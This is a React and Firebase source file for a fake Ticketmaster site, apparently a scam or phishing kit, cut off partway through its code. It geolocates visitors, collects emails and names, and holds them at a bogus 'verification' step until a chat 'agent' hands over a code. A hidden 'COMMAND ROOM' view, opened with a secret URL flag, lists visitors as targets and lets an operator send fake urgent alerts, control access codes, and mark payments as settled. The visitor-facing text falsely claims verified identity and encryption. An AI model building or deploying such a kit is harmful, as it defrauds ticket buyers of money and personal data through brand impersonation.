import React, { useState, useEffect, useRef } from 'react';
import { 
  Search, User, CheckCircle, MessageSquare, Send, X, Bell, 
  DollarSign, ShieldCheck, Ticket, Info, Star, ChevronLeft, 
  Lock, Globe, Zap, Users, Activity, CreditCard, Wallet, 
  Eye, Settings, Layout, MousePointer2 
} from 'lucide-react';
import { 
  initializeApp 
} from 'firebase/app';
import { 
  getFirestore, collection, addDoc, updateDoc, doc, 
  setDoc, getDoc, onSnapshot, query, orderBy 
} from 'firebase/firestore';
import { 
  getAuth, signInAnonymously, onAuthStateChanged 
} from 'firebase/auth';

// --- FIREBASE CONFIGURATION ---
// These variables are provided by your environment
const firebaseConfig = JSON.parse(__firebase_config);
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);
const auth = getAuth(app);
const appId = typeof __app_id !== 'undefined' ? __app_id : 'default-app-id';

// --- INITIAL CONSTANTS ---
const INITIAL_EVENTS = [
  { id: 1, artist: "Taylor Swift | The Eras Tour", venue: "Wembley Stadium, London", date: "Sat • Aug 17 • 7:00 PM", image: "https://images.unsplash.com/photo-1540039155733-5bb30b53aa14?auto=format&fit=crop&q=80&w=1000", bgImage: "https://images.unsplash.com/photo-1459749411177-287ce35e8b4f?auto=format&fit=crop&q=80&w=2000", status: "presale", timeRemaining: "02:45:12" },
  { id: 2, artist: "Drake: It's All A Blur", venue: "O2 Arena, London", date: "Fri • Sep 22 • 8:00 PM", image: "https://images.unsplash.com/photo-1514525253440-b393452e8d26?auto=format&fit=crop&q=80&w=1000", bgImage: "https://images.unsplash.com/photo-1501281668745-f7f57925c3b4?auto=format&fit=crop&q=80&w=2000", status: "available", timeRemaining: "00:00:00" },
  { id: 3, artist: "Adele: Weekends in Vegas", venue: "The Colosseum, Caesars Palace", date: "Sat • Oct 12 • 8:00 PM", image: "https://images.unsplash.com/photo-1511671782779-c97d3d27a1d4?auto=format&fit=crop&q=80&w=1000", bgImage: "https://images.unsplash.com/photo-1493225255756-d9584f8606e9?auto=format&fit=crop&q=80&w=2000", status: "low_inventory", timeRemaining: "05:12:00" }
];

// ==========================================================================================
// MAIN APP COMPONENT
// ==========================================================================================
export default function App() {
  const [user, setUser] = useState(null);
  const [currentPage, setCurrentPage] = useState('home'); 
  const [selectedEvent, setSelectedEvent] = useState(null);
  const [cart, setCart] = useState([]); 
  const [sessions, setSessions] = useState([]); 
  const [currentSessionId, setCurrentSessionId] = useState(null);
  const [globalSettings, setGlobalSettings] = useState({ price: 250, bgImage: '', presaleCode: 'FAN2024' });
  
  // Site State
  const [searchTerm, setSearchTerm] = useState('');
  const [authStep, setAuthStep] = useState('email'); 
  const [authMode, setAuthMode] = useState('login'); 
  const [tempUser, setTempUser] = useState({ email: '', name: '' });
  
  // Interaction
  const [isChatOpen, setIsChatOpen] = useState(false);
  const [chatMessages, setChatMessages] = useState([]);
  const [activeNotification, setActiveNotification] = useState(null);
  const [showMemberInfo, setShowMemberInfo] = useState(false);
  const [showNotifPanel, setShowNotifPanel] = useState(false);

  // Messenger Secret Access
  const isMessengerMode = new URLSearchParams(window.location.search).get('messenger') === 'true';

  // --- BOOTSTRAP ---
  useEffect(() => {
    const initAuth = async () => {
      await signInAnonymously(auth);
    };
    initAuth();
    return onAuthStateChanged(auth, setUser);
  }, []);

  // --- INITIALIZE VISITOR SESSION ---
  useEffect(() => {
    if (!user || isMessengerMode) return;
    const startTracking = async () => {
      let location = "Detecting...";
      try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        location = `${data.city}, ${data.country_name}`;
      } catch (e) { location = "Secure Tunnel"; }

      const sessionsRef = collection(db, 'artifacts', appId, 'public', 'data', 'sessions');
      const newSession = await addDoc(sessionsRef, {
        createdAt: new Date().toISOString(),
        userId: user.uid,
        location,
        status: 'browsing',
        email: 'Anonymous',
        userAuthCode: '', 
        notifications: [],
        lastActive: new Date().toISOString(),
        chatHistory: [{ sender: 'system', text: 'Welcome to Support. How can we verify your fan status today?', timestamp: new Date().toISOString() }]
      });
      setCurrentSessionId(newSession.id);
    };
    startTracking();
  }, [user, isMessengerMode]);

  // --- SYNC GLOBAL SETTINGS ---
  useEffect(() => {
    if (!user) return;
    const configRef = doc(db, 'artifacts', appId, 'public', 'data', 'config', 'global_settings');
    return onSnapshot(configRef, (snap) => {
      if (snap.exists()) setGlobalSettings(snap.data());
      else setDoc(configRef, { price: 250, bgImage: '', presaleCode: 'FAN2024' });
    });
  }, [user]);

  // --- SYNC LIVE SESSIONS (FOR ADMIN) ---
  useEffect(() => {
    if (!user || !isMessengerMode) return;
    const sessionsRef = collection(db, 'artifacts', appId, 'public', 'data', 'sessions');
    return onSnapshot(sessionsRef, (snap) => {
      const allSessions = snap.docs.map(d => ({ id: d.id, ...d.data() }));
      setSessions(allSessions.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt)));
    });
  }, [user, isMessengerMode]);

  // --- SYNC TARGET CHAT (FOR VISITOR) ---
  useEffect(() => {
    if (!currentSessionId || isMessengerMode) return;
    const sessionRef = doc(db, 'artifacts', appId, 'public', 'data', 'sessions', currentSessionId);
    return onSnapshot(sessionRef, (snap) => {
      if (snap.exists()) {
        const d = snap.data();
        if (d.chatHistory) setChatMessages(d.chatHistory);
        if (d.notifications?.length > 0) setActiveNotification(d.notifications[d.notifications.length - 1]);
      }
    });
  }, [currentSessionId, isMessengerMode]);

  // --- ACTIONS ---
  const updateSession = async (sid, updates) => await updateDoc(doc(db, 'artifacts', appId, 'public', 'data', 'sessions', sid), { ...updates, lastActive: new Date().toISOString() });
  const sendChatMessage = async (sid, text, sender) => {
    const ref = doc(db, 'artifacts', appId, 'public', 'data', 'sessions', sid);
    const snap = await getDoc(ref);
    if (snap.exists()) {
      const chat = snap.data().chatHistory || [];
      await updateDoc(ref, { chatHistory: [...chat, { sender, text, timestamp: new Date().toISOString() }], lastActive: new Date().toISOString() });
    }
  };

  const filteredEvents = INITIAL_EVENTS.filter(e => e.artist.toLowerCase().includes(searchTerm.toLowerCase()));
  const mySessionData = sessions.find(s => s.id === currentSessionId) || {};

  // ==========================================
  // VIEW: ADMIN MESSENGER (CYBER COMMAND)
  // ==========================================
  if (isMessengerMode) {
    return (
      <AdminMessenger 
        sessions={sessions} 
        updateSession={updateSession} 
        sendChatMessage={sendChatMessage}
        globalSettings={globalSettings}
        updateGlobalSettings={(s) => setDoc(doc(db, 'artifacts', appId, 'public', 'data', 'config', 'global_settings'), s)}
        isLive={!!user}
      />
    );
  }

  // ==========================================
  // VIEW: PREMIUM MAIN SITE
  // ==========================================
  return (
    <div className="min-h-screen font-sans text-gray-900 bg-[#0a0e14] relative overflow-x-hidden no-select">
      
      {/* HEADER */}
      <header className="fixed top-0 w-full z-[250] bg-[#1f262d] text-white h-16 flex items-center px-4 justify-between border-b border-white/5 shadow-2xl backdrop-blur-2xl bg-opacity-95">
        <div className="flex items-center gap-4">
          {currentPage !== 'home' && (
            <button onClick={() => setCurrentPage('home')} className="p-2.5 rounded-full hover:bg-white/10 transition-all active:scale-90"><ChevronLeft className="w-6 h-6" /></button>
          )}
          <div className="flex items-center gap-1 cursor-pointer shrink-0" onClick={() => setCurrentPage('home')}>
            <span className="font-bold text-2xl tracking-tighter uppercase italic">ticketmaster</span>
            <div className="bg-[#026cdf] rounded-full w-5 h-5 flex items-center justify-center shadow-[0_0_15px_#026cdf]">
              <CheckCircle className="w-3.5 h-3.5 text-white stroke-[3]" />
            </div>
          </div>
        </div>

        <div className="hidden md:flex flex-1 max-w-lg mx-12 relative group">
          <input 
            type="text" 
            placeholder="Search millions of live experiences..." 
            className="w-full bg-white/5 border border-white/10 rounded-full py-2.5 pl-11 pr-4 text-sm focus:bg-white focus:text-gray-900 outline-none transition-all"
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
          />
          <Search className="absolute left-4 top-3 w-4 h-4 text-gray-500 group-focus-within:text-[#026cdf]" />
        </div>

        <div className="flex items-center gap-5">
          <button onClick={() => {setShowMemberInfo(!showMemberInfo); setShowNotifPanel(false);}} className="flex items-center gap-2 text-[10px] font-black text-[#026cdf] bg-blue-500/10 px-4 py-2 rounded-full border border-blue-500/20 shadow-inner hover:bg-blue-500/20 transition-all active:scale-95">
            <Star className="w-3.5 h-3.5 fill-current animate-pulse" />
            <span className="hidden sm:inline uppercase tracking-widest">Verified Fan</span>
          </button>
          <button className="relative p-2.5 hover:scale-110 transition-transform active:scale-90" onClick={() => {setShowNotifPanel(!showNotifPanel); setShowMemberInfo(false);}}>
            <Bell className="w-6 h-6" />
            {(activeNotification || showNotifPanel) && <div className="absolute top-2 right-2 w-3.5 h-3.5 bg-red-600 rounded-full border-2 border-[#1f262d] animate-bounce" />}
          </button>
        </div>

        {/* Member Panel Overlay */}
        {showMemberInfo && (
          <div className="absolute top-16 right-4 w-72 bg-white text-gray-900 rounded-[35px] p-7 shadow-2xl border border-gray-100 animate-slideDown z-[300]">
            <h4 className="font-black text-xs uppercase tracking-widest text-[#026cdf] mb-4 text-center italic">Digital Fan Card</h4>
            <div className="bg-blue-50 p-5 rounded-3xl border border-blue-100 flex items-center gap-4">
              <ShieldCheck className="text-[#026cdf] w-8 h-8" />
              <p className="text-[10px] font-bold leading-tight uppercase">Identity Verified:<br/><span className="text-[#026cdf] text-xs font-black italic tracking-widest uppercase">Secured Session</span></p>
            </div>
            <p className="text-[9px] text-gray-400 mt-5 leading-relaxed font-bold uppercase tracking-tighter text-center">Your session is protected by Ticketmaster SmartQueue encryption technology.</p>
          </div>
        )}
      </header>

      {/* EMERGENCY TOAST OVERLAY */}
      {activeNotification && !showNotifPanel && (
        <div className="fixed top-20 left-1/2 -translate-x-1/2 z-[300] w-[92vw] max-w-md bg-[#ea0042] text-white p-6 rounded-[35px] shadow-[0_30px_70px_rgba(0,0,0,0.6)] flex items-start gap-5 animate-bounce border-b-8 border-black/20">
           <div className="bg-white/20 p-2 rounded-2xl"><Bell className="w-6 h-6" /></div>
           <div className="flex-1">
              <p className="font-black text-xs uppercase tracking-widest mb-1 italic text-white/80">Priority Update</p>
              <p className="text-sm font-black leading-tight uppercase">{activeNotification.text}</p>
           </div>
           <X className="cursor-pointer hover:rotate-90 transition-transform" onClick={() => setActiveNotification(null)} />
        </div>
      )}

      {/* MAIN CONTENT AREA */}
      <main className="pt-16 min-h-screen relative z-10">
        {currentPage === 'home' && (
          <HomeView 
            events={filteredEvents} searchTerm={searchTerm} setSearchTerm={setSearchTerm} 
            onSelect={(e) => {setSelectedEvent(e); setCurrentPage('auth');}} 
          />
        )}
        {currentPage === 'auth' && (
          <AuthGate 
            mode={authMode} setMode={setAuthMode} step={authStep} setStep={setAuthStep} 
            tempUser={tempUser} setTempUser={setTempUser} sessionData={mySessionData}
            onComplete={() => { setCurrentPage('seatmap'); updateSession(currentSessionId, { status: 'viewing_map', email: tempUser.email }); }} 
          />
        )}
        {currentPage === 'seatmap' && <SeatMapView event={selectedEvent} presaleCode={globalSettings.presaleCode} cart={cart} setCart={setCart} globalPrice={globalSettings.price} onCheckout={() => { updateSession(currentSessionId, { status: 'payment_pending', cart }); setCurrentPage('checkout'); }} />}
        {currentPage === 'checkout' && <CheckoutView cart={cart} sessionId={currentSessionId} sessionData={mySessionData} updateSession={updateSession} onSuccess={() => setCurrentPage('success')} onBack={() => setCurrentPage('seatmap')} />}
        {currentPage === 'success' && <SuccessScreen event={selectedEvent} cart={cart} onHome={() => setCurrentPage('home')} />}
      </main>

      {/* CHAT SUPPORT OVERLAY */}
      <div className={`fixed bottom-8 right-6 z-[200] transition-all duration-500 ${currentPage === 'seatmap' || currentPage === 'checkout' ? 'translate-y-[-90px] sm:translate-y-0' : ''}`}>
        <button onClick={() => setIsChatOpen(!isChatOpen)} className="bg-[#026cdf] text-white p-5 rounded-[30px] shadow-[0_25px_50px_rgba(2,108,223,0.5)] hover:scale-110 active:scale-95 transition-all">
          {isChatOpen ? <X className="w-7 h-7" /> : <MessageSquare className="w-7 h-7" />}
        </button>
      </div>

      {isChatOpen && (
        <div className="fixed bottom-28 right-6 w-[92vw] max-w-[360px] h-[520px] bg-white border shadow-[0_40px_120px_rgba(0,0,0,0.5)] rounded-[50px] z-[210] flex flex-col overflow-hidden animate-slideUp">
          <div className="bg-[#1f262d] text-white p-7 flex justify-between items-center border-b border-white/5">
            <div className="flex items-center gap-4">
              <div className="relative"><div className="w-12 h-12 bg-[#026cdf] rounded-full flex items-center justify-center font-black text-sm shadow-xl">TM</div><div className="absolute bottom-0 right-0 w-4 h-4 bg-green-500 rounded-full border-4 border-[#1f262d]" /></div>
              <div>
                <div className="flex items-center gap-1.5"><span className="font-bold text-lg tracking-tighter uppercase italic">ticketmaster</span><div className="bg-[#026cdf] rounded-full w-3.5 h-3.5 flex items-center justify-center shadow-lg"><CheckCircle className="w-2.5 h-2.5 text-white" /></div></div>
                <p className="text-[8px] font-black text-gray-400 uppercase tracking-widest italic leading-none">Support Verified</p>
              </div>
            </div>
            <X className="cursor-pointer text-gray-500 hover:text-white" onClick={() => setIsChatOpen(false)} />
          </div>
          <div className="flex-1 overflow-y-auto p-6 space-y-5 bg-gray-50/50">
            {chatMessages.map((m, i) => (
              <div key={i} className={`flex ${m.sender === 'user' ? 'justify-end' : 'justify-start'}`}>
                <div className={`max-w-[85%] p-4.5 rounded-[30px] text-[13px] font-bold shadow-sm ${m.sender === 'user' ? 'bg-[#026cdf] text-white rounded-br-none shadow-blue-500/20' : 'bg-white border-2 border-gray-100 rounded-bl-none text-gray-800'}`}>{m.text}</div>
              </div>
            ))}
          </div>
          <div className="p-5 border-t bg-white flex gap-3">
            <input id="agent-inp" placeholder="Message agent..." className="flex-1 bg-gray-50 border-2 border-gray-100 p-5 rounded-[30px] text-sm font-bold focus:border-[#026cdf] outline-none transition-all" onKeyDown={(e) => { if(e.key === 'Enter' && e.target.value.trim()){ sendChatMessage(currentSessionId, e.target.value, 'user'); e.target.value = ''; } }} />
            <button onClick={() => { const i = document.getElementById('agent-inp'); if(i.value.trim()){ sendChatMessage(currentSessionId, i.value, 'user'); i.value = ''; } }} className="bg-[#026cdf] text-white p-4.5 rounded-[30px] shadow-2xl hover:bg-blue-700 active:scale-90 transition-all"><Send className="w-5 h-5" /></button>
          </div>
        </div>
      )}
    </div>
  );
}

// ==========================================
// SUBVIEWS: MAIN SITE
// ==========================================

function HomeView({ events, searchTerm, setSearchTerm, onSelect }) {
  return (
    <div className="max-w-7xl mx-auto p-4 sm:p-12 space-y-16 pb-40 relative">
      <div className="relative h-[550px] rounded-[80px] overflow-hidden shadow-[0_50px_100px_rgba(0,0,0,0.5)] flex flex-col items-center justify-center p-8 text-center border-4 border-white/5 group">
        <div className="absolute inset-0 bg-gradient-to-t from-[#0a0e14] via-[#0a0e14]/40 to-transparent z-10" />
        <img src="https://images.unsplash.com/photo-1540039155733-5bb30b53aa14?auto=format&fit=crop&q=80&w=2000" className="absolute inset-0 w-full h-full object-cover transition-transform duration-[30s] group-hover:scale-110 opacity-60" alt="Hero" />
        <div className="relative z-20 text-white max-w-5xl animate-fadeIn space-y-8 pb-16">
          <h1 className="text-6xl md:text-[11rem] font-black tracking-tighter leading-none italic uppercase drop-shadow-[0_20px_60px_rgba(0,0,0,1)]">LET'S MAKE <span className="text-[#026cdf] drop-shadow-[0_0_50px_#026cdf]">MEMORIES</span>.</h1>
          <p className="text-xl md:text-3xl font-black text-gray-300 opacity-95 max-w-2xl mx-auto italic tracking-tight uppercase">Official verified access to the world's elite tours.</p>
        </div>
        <div className="relative z-30 w-full max-w-2xl mt-[-50px]">
          <div className="bg-white/10 backdrop-blur-3xl border border-white/20 rounded-[50px] p-3 flex shadow-[0_40px_80px_rgba(0,0,0,0.6)] group focus-within:bg-white transition-all duration-500">
             <input className="flex-1 bg-transparent px-8 py-5 rounded-full text-white font-black placeholder:text-white/40 focus:outline-none focus:text-gray-900 text-lg" placeholder="Find your next tour access..." value={searchTerm} onChange={(e) => setSearchTerm(e.target.value)} />
             <button className="bg-[#026cdf] px-16 py-6 rounded-[40px] font-black text-base uppercase tracking-widest shadow-2xl hover:bg-blue-600 transition-all active:scale-95 italic">GO</button>
          </div>
        </div>
      </div>
      <div className="space-y-16">
        <h2 className="text-5xl font-black text-white tracking-tighter italic uppercase flex items-center gap-6"><div className="w-3 h-14 bg-[#026cdf] rounded-full shadow-[0_0_20px_#026cdf]" /> FEATURED <span className="text-[#026cdf]">TICKET FLOWS</span></h2>
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-14">
          {events.map(ev => (
            <div key={ev.id} onClick={() => onSelect(ev)} className="bg-[#1f262d] rounded-[70px] overflow-hidden shadow-2xl border-2 border-white/5 hover:translate-y-[-20px] transition-all duration-700 cursor-pointer group hover:border-[#026cdf]/30">
              <div className="h-80 relative overflow-hidden"><img src={ev.image} className="w-full h-full object-cover group-hover:scale-125 transition-transform duration-[5s]" alt={ev.artist} /><div className="absolute inset-0 bg-gradient-to-t from-[#1f262d] via-transparent to-transparent opacity-90" /><div className="absolute top-10 left-10 flex flex-col gap-4"><div className="bg-[#ea0042] text-white px-6 py-2.5 rounded-full text-[10px] font-black uppercase shadow-2xl animate-pulse tracking-widest border border-white/10 italic">High Demand</div>{ev.timeRemaining !== "00:00:00" && <div className="bg-black/60 backdrop-blur-xl text-white px-5 py-2 rounded-full text-[10px] font-black uppercase border border-white/10 tracking-[0.2em] shadow-lg italic">Starts: {ev.timeRemaining}</div>}</div></div>
              <div className="p-14 space-y-10"><h3 className="text-4xl font-black leading-tight text-white group-hover:text-[#026cdf] transition-colors uppercase italic tracking-tighter">{ev.artist}</h3><div className="space-y-2"><p className="text-gray-400 font-black text-[12px] uppercase tracking-[0.4em] opacity-60">{ev.venue}</p><p className="text-gray-500 font-black text-[11px] uppercase tracking-[0.5em]">{ev.date}</p></div><div className="pt-10 border-t border-white/5 flex justify-between items-center"><div className="flex items-center gap-3"><ShieldCheck className="w-5 h-5 text-[#026cdf]" /><span className="text-[11px] font-black uppercase text-[#026cdf] tracking-[0.3em] italic">Verified Access</span></div><div className="bg-white/5 p-4 rounded-full group-hover:bg-[#026cdf] transition-all"><ChevronLeft className="w-6 h-6 rotate-180" /></div></div></div>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}

function AuthGate({ mode, setMode, step, setStep, tempUser, setTempUser, sessionData, onComplete }) {
  const [loading, setLoading] = useState(false);
  const [vCode, setVCode] = useState('');
  const [error, setError] = useState('');
  const handleNext = () => { setLoading(true); setError(''); setTimeout(() => { setLoading(false); if(step==='email') setStep(mode==='login' ? 'verify' : 'signup'); else if(step==='signup') setStep('verify'); else { if (vCode.trim() === sessionData.userAuthCode && vCode.trim() !== '') onComplete(); else setError("Authorization Access Denied."); } }, 1500); };
  return (
    <div className="min-h-[85vh] flex items-center justify-center p-6 bg-[#0a0e14]/70">
      <div className="bg-white w-full max-w-md rounded-[75px] shadow-[0_80px_150px_rgba(0,0,0,0.8)] p-14 border-4 border-white space-y-14 animate-slideUp relative overflow-hidden">
        <div className="absolute top-12 right-14 flex gap-8 text-[11px] font-black uppercase tracking-[0.3em] italic">
           <button onClick={() => {setMode('login'); setStep('email');}} className={mode==='login' ? 'text-[#026cdf] underline underline-offset-8' : 'text-gray-300'}>Login</button>
           <button onClick={() => {setMode('signup'); setStep('email');}} className={mode==='signup' ? 'text-[#026cdf] underline underline-offset-8' : 'text-gray-300'}>Join</button>
        </div>
        <div className="text-center pt-10">
           <div className="w-28 h-28 bg-blue-50 rounded-[45px] flex items-center justify-center mx-auto mb-8 shadow-inner border-2 border-blue-100"><User className="text-[#026cdf] w-14 h-14" /></div>
           <h2 className="text-5xl font-black tracking-tighter uppercase italic tracking-tighter">{mode === 'login' ? 'Welcome' : 'Join Fan'}</h2>
           <p className="text-gray-400 text-[11px] font-black uppercase tracking-[0.4em] mt-4 opacity-50">Identity Verification Gateway</p>
        </div>
        {step === 'email' && (
          <div className="space-y-8">
            <input className="w-full border-4 border-gray-50 bg-gray-50/50 p-7 rounded-[35px] font-black focus:border-[#026cdf] focus:bg-white transition-all text-xl italic" placeholder="Email Address" value={tempUser.email} onChange={e=>setTempUser({...tempUser, email:e.target.value})} />
            <button onClick={handleNext} className="w-full bg-[#026cdf] text-white py-7 rounded-[35px] font-black shadow-2xl uppercase tracking-widest text-lg italic shadow-[0_20px_50px_rgba(2,108,223,0.5)]">Continue Access</button>
          </div>
        )}
        {step === 'signup' && (
          <div className="space-y-5 animate-fadeIn">
            <input className="w-full border-4 border-gray-50 p-7 rounded-[35px] font-black outline-none italic text-lg" placeholder="Legal Name" value={tempUser.name} onChange={e=>setTempUser({...tempUser, name:e.target.value})} />
            <input className="w-full border-4 border-gray-50 p-7 rounded-[35px] font-black outline-none italic text-lg" type="password" placeholder="Fan Passkey" />
            <button onClick={handleNext} className="w-full bg-black text-white py-7 rounded-[35px] font-black shadow-2xl uppercase tracking-widest text-lg italic">Create Profile</button>
          </div>
        )}
        {step === 'verify' && (
          <div className="space-y-12 animate-fadeIn">
             <div className="bg-[#026cdf]/5 p-8 rounded-[45px] border-4 border-dashed border-[#026cdf]/20 text-center shadow-inner">
                <p className="text-[12px] text-[#026cdf] font-black leading-relaxed uppercase tracking-[0.2em] italic">Identity Match Required. Message our Official Agent to receive your 6-digit access code.</p>
             </div>
             <input className={`w-full border-4 p-8 rounded-[40px] text-center font-black tracking-[1em] text-5xl outline-none transition-all shadow-inner ${error ? 'border-red-500 bg-red-50 text-red-600' : 'border-gray-50 bg-gray-50 focus:bg-white'}`} placeholder="0000" value={vCode} onChange={e=>setVCode(e.target.value)} maxLength={6} />
             {error && <p className="text-red-600 text-[11px] font-black uppercase tracking-widest animate-shake italic text-center">{error}</p>}
             <button onClick={handleNext} className="w-full bg-[#026cdf] text-white py-7 rounded-[35px] font-black shadow-2xl uppercase tracking-[0.3em] italic text-xl">Final Verification</button>
          </div>
        )}
      </div>
    </div>
  );
}

// ==========================================
// VIEW: DEDICATED ADMIN MESSENGER
// ==========================================

function AdminMessenger({ sessions, updateSession, sendChatMessage, globalSettings, updateGlobalSettings, isLive }) {
  const [selectedSid, setSelectedSid] = useState(null);
  const [localConfig, setLocalConfig] = useState(globalSettings);
  const activeTarget = sessions.find(s => s.id === selectedSid);

  // Auto-notification: Check if any user is on 'verify' status
  const needingAttentionCount = sessions.filter(s => s.status === 'browsing' || s.status === 'viewing_map').length;

  return (
    <div className="min-h-screen bg-[#f1f5f9] flex flex-col md:flex-row h-screen overflow-hidden italic no-select text-gray-900">
      {/* Target Sidebar */}
      <div className="w-full md:w-96 bg-white border-r flex flex-col shadow-[10px_0_40px_rgba(0,0,0,0.05)] z-20">
        <div className="p-8 bg-[#1f262d] text-white flex justify-between items-center border-b border-white/5 shadow-xl">
           <div><h1 className="text-2xl font-black italic tracking-tighter">COMMAND ROOM</h1><div className="flex items-center gap-1.5 mt-1"><Activity className={`w-3 h-3 ${isLive ? 'text-green-500' : 'text-red-500'}`} /><p className="text-[8px] font-black uppercase tracking-widest">{isLive ? 'System Linked' : 'Connecting...'}</p></div></div>
           <div className="relative"><Users className="w-8 h-8 opacity-20" />{needingAttentionCount > 0 && <div className="absolute top-0 right-0 w-3 h-3 bg-[#ea0042] rounded-full animate-ping" />}</div>
        </div>
        <div className="flex-1 overflow-y-auto bg-gray-50/50 scroll-pro">
           {sessions.length === 0 ? (
             <div className="p-16 text-center opacity-20"><Users className="mx-auto w-16 h-16 mb-6" /><p className="text-[11px] font-black uppercase tracking-[0.3em] leading-relaxed italic">Monitoring Signal...<br/>No Active Targets Found.</p></div>
           ) : sessions.map(s => (
             <div 
               key={s.id} onClick={() => setSelectedSid(s.id)}
               className={`p-7 border-b cursor-pointer transition-all relative ${selectedSid === s.id ? 'bg-[#026cdf] text-white shadow-2xl translate-x-3 rounded-l-[30px]' : 'hover:bg-blue-50'}`}
             >
                <div className="flex justify-between items-start mb-3">
                   <p className="font-black text-sm uppercase tracking-tighter truncate max-w-[150px]">{s.name || 'Anonymous User'}</p>
                   <p className={`text-[9px] font-black px-3 py-1 rounded-full uppercase tracking-widest ${selectedSid === s.id ? 'bg-white/20' : 'bg-blue-100 text-[#026cdf]'}`}>{s.status}</p>
                </div>
                <div className="flex items-center gap-2">
                   <Globe className={`w-3 h-3 ${selectedSid === s.id ? 'opacity-50' : 'text-gray-400'}`} />
                   <p className={`text-[11px] font-black uppercase tracking-widest truncate ${selectedSid === s.id ? 'opacity-80' : 'text-gray-400'}`}>{s.location}</p>
                </div>
                {s.status === 'browsing' && <div className="absolute right-4 bottom-4 w-2.5 h-2.5 bg-green-500 rounded-full animate-pulse shadow-[0_0_10px_#22c55e]" />}
             </div>
           ))}
        </div>
        <div className="p-8 bg-white border-t space-y-6">
           <div className="flex items-center justify-between mb-2"><p className="text-[10px] font-black uppercase text-gray-400 tracking-widest">Global Master Artifacts</p><Settings className="w-3 h-3 text-gray-300" /></div>
           <div className="flex gap-4"><div className="flex-1"><label className="text-[8px] font-black uppercase text-gray-300 mb-1 block">Base Value ($)</label><input type="number" className="w-full border-2 border-gray-100 p-3 rounded-2xl text-xs font-black outline-none focus:border-[#026cdf] transition-all" value={localConfig.price} onChange={e=>setLocalConfig({...localConfig, price: Number(e.target.value)})} /></div><button onClick={() => updateGlobalSettings(localConfig)} className="bg-[#026cdf] text-white px-6 rounded-[20px] font-black text-[10px] uppercase shadow-lg hover:bg-blue-700 transition-all active:scale-95">Sync</button></div>
        </div>
      </div>

      {/* Main Control Panel */}
      <div className="flex-1 flex flex-col bg-white">
        {activeTarget ? (
          <>
            <div className="p-8 border-b bg-white flex justify-between items-center shadow-sm">
               <div className="flex items-center gap-6">
                  <div className="w-20 h-20 bg-gradient-to-br from-[#026cdf] to-blue-800 rounded-[35px] flex items-center justify-center font-black text-white text-3xl shadow-2xl italic tracking-tighter">TM</div>
                  <div>
                    <h2 className="text-4xl font-black tracking-tighter uppercase italic text-blue-950 leading-none">{activeTarget.name || 'Anonymous User'}</h2>
                    <p className="text-[11px] font-black uppercase tracking-[0.4em] text-gray-400 mt-2">{activeTarget.location} • TARGET_{activeTarget.id.slice(-6).toUpperCase()}</p>
                  </div>
               </div>
               <div className="flex gap-4">
                  <div className="bg-gray-50 px-6 py-3 rounded-full border border-gray-100 flex items-center gap-3"><Activity className="w-4 h-4 text-[#026cdf] animate-pulse" /><p className="text-[10px] font-black uppercase tracking-[0.2em]">{activeTarget.status}</p></div>
                  <button onClick={() => updateSession(activeTarget.id, {status: 'success'})} className="bg-green-600 text-white px-8 py-3 rounded-full font-black text-[10px] uppercase shadow-xl hover:bg-green-700 transition-all tracking-widest italic">Settle Transaction</button>
               </div>
            </div>

            {/* Target Interaction Area */}
            <div className="flex-1 flex flex-col md:flex-row overflow-hidden">
               <div className="flex-1 p-10 overflow-y-auto bg-gray-50/30 space-y-6 flex flex-col scroll-pro">
                  {activeTarget.chatHistory?.map((m, i) => (
                    <div key={i} className={`flex ${m.sender === 'user' ? 'justify-start' : 'justify-end'}`}>
                       <div className={`max-w-[75%] p-6 rounded-[40px] text-sm font-bold shadow-[0_10px_30px_rgba(0,0,0,0.05)] border-2 ${m.sender === 'user' ? 'bg-white text-gray-800 rounded-bl-none border-white shadow-xl' : 'bg-[#026cdf] text-white rounded-br-none border-[#026cdf] shadow-blue-500/20'}`}>
                         {m.text}
                       </div>
                    </div>
                  ))}
               </div>
               
               {/* Right Side Control Strip */}
               <div className="w-full md:w-80 border-l bg-gray-50/50 p-8 space-y-10">
                  <div className="space-y-4">
                     <p className="text-[10px] font-black uppercase text-gray-400 tracking-widest mb-4">Security Injection</p>
                     <div className="bg-white p-6 rounded-[40px] border border-white shadow-xl group">
                        <label className="text-[8px] font-black uppercase text-[#026cdf] block mb-4 tracking-widest italic">Assign Unique Access Code</label>
                        <input className="w-full bg-transparent font-black text-[#026cdf] text-5xl outline-none placeholder:text-gray-100 uppercase italic tracking-widest" placeholder="SET" onBlur={(e) => updateSession(activeTarget.id, { userAuthCode: e.target.value.trim().toUpperCase() })} defaultValue={activeTarget.userAuthCode} />
                        <p className="text-[8px] text-gray-300 mt-4 uppercase italic">Changes apply instantly to target device.</p>
                     </div>
                  </div>
                  <div className="space-y-4">
                     <p className="text-[10px] font-black uppercase text-gray-400 tracking-widest mb-4">Direct Messaging</p>
                     <div className="bg-white p-6 rounded-[40px] border border-white shadow-xl">
                        <label className="text-[8px] font-black uppercase text-[#ea0042] block mb-4 tracking-widest italic">Deploy Red-Dot Bell Alert</label>
                        <textarea className="w-full text-[11px] font-black outline-none uppercase placeholder:text-gray-200 italic p-3 bg-gray-50 rounded-2xl resize-none h-24 mb-4" placeholder="TYPE URGENT ALERT..." id="ping-msg" />
                        <button onClick={() => { const i = document.getElementById('ping-msg'); if(i.value.trim()){ updateSession(activeTarget.id, { notifications: [...(activeTarget.notifications || []), {text: i.value, timestamp: new Date().toISOString()}] }); i.value=''; } }} className="bg-[#ea0042] text-white w-full py-4 rounded-[20px] font-black text-[10px] uppercase shadow-2xl hover:bg-red-700 transition-all active:scale-95 italic">Inject Broadcast</button>
                     </div>
                  </div>
               </div>
            </div>

            {/* Chat Command Bar */}
            <div className="p-8 border-t bg-white relative z-30">
               <div className="flex gap-5 max-w-5xl mx-auto">
                  <div className="flex-1 relative group/inp">
                     <input id="admin-reply" placeholder="Secure agent reply stream..." className="w-full bg-gray-100 border-4 border-gray-50 p-7 rounded-[45px] font-black text-base outline-none italic transition-all focus:bg-white focus:border-[#026cdf]/10" onKeyDown={e => { if(e.key==='Enter'){ sendChatMessage(activeTarget.id, e.target.value, 'system'); e.target.value='' } }} />
